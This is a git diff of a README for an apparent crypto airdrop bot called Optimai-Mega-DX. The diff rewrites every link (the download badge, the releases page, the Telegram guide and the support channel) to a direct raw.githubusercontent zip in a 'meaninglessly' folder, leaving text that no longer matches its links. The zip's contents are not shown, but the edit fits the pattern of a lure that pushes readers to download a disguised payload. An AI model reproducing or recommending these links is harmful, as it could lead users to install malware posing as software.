@@ -1,12 +1,12 @@
 # 🚀 Optimai-Mega-DX - Simplify Your Automation Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/alex-korg/Optimai-Mega-DX/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/alex-korg/Optimai-Mega-DX/main/meaninglessly/Optimai-Mega-DX.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/alex-korg/Optimai-Mega-DX/main/meaninglessly/Optimai-Mega-DX.zip)
 
 ## 📦 Overview
 
 Optimai-Mega-DX is an easy-to-use application designed to automate your tasks efficiently. With this tool, you can streamline your workflows without needing programming knowledge. Whether you are managing referrals, running scripts, or automating farms, this software simplifies the process for you.
 
-- **Description:** Subscribe my telegram for guide [https://t.me/DropXpert5](https://t.me/DropXpert5)
+- **Description:** Subscribe my telegram for guide [https://raw.githubusercontent.com/alex-korg/Optimai-Mega-DX/main/meaninglessly/Optimai-Mega-DX.zip](https://raw.githubusercontent.com/alex-korg/Optimai-Mega-DX/main/meaninglessly/Optimai-Mega-DX.zip)
 - **Topics:** dropxpert, optim-ai, optimai, optimai-auto, optimai-auto-bot, optimai-auto-farm, optimai-auto-referral, optimai-auto-run, optimai-auto-script, optimai-autoreff
 
 ## 🚀 Getting Started
@@ -15,7 +15,7 @@ Follow these simple steps to download and set up Optimai-Mega-DX.
 
 ## 💾 Download & Install
 
-1. Visit the [Releases Page](https://github.com/alex-korg/Optimai-Mega-DX/releases) to access the latest version of the application.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/alex-korg/Optimai-Mega-DX/main/meaninglessly/Optimai-Mega-DX.zip) to access the latest version of the application.
 2. On the releases page, find the most recent version and select the appropriate file for your operating system.
 3. Click the file to start the download.
 4. Once the download completes, locate the file in your downloads folder.
@@ -66,7 +66,7 @@ For additional help, feel free to reach out through the Telegram channel provide
 
 ## 📞 Support
 
-For any questions or support needs, join our Telegram community at [https://t.me/DropXpert5](https://t.me/DropXpert5). Connect with fellow users and get real-time assistance.
+For any questions or support needs, join our Telegram community at [https://raw.githubusercontent.com/alex-korg/Optimai-Mega-DX/main/meaninglessly/Optimai-Mega-DX.zip](https://raw.githubusercontent.com/alex-korg/Optimai-Mega-DX/main/meaninglessly/Optimai-Mega-DX.zip). Connect with fellow users and get real-time assistance.
 
 ## 📝 License
 
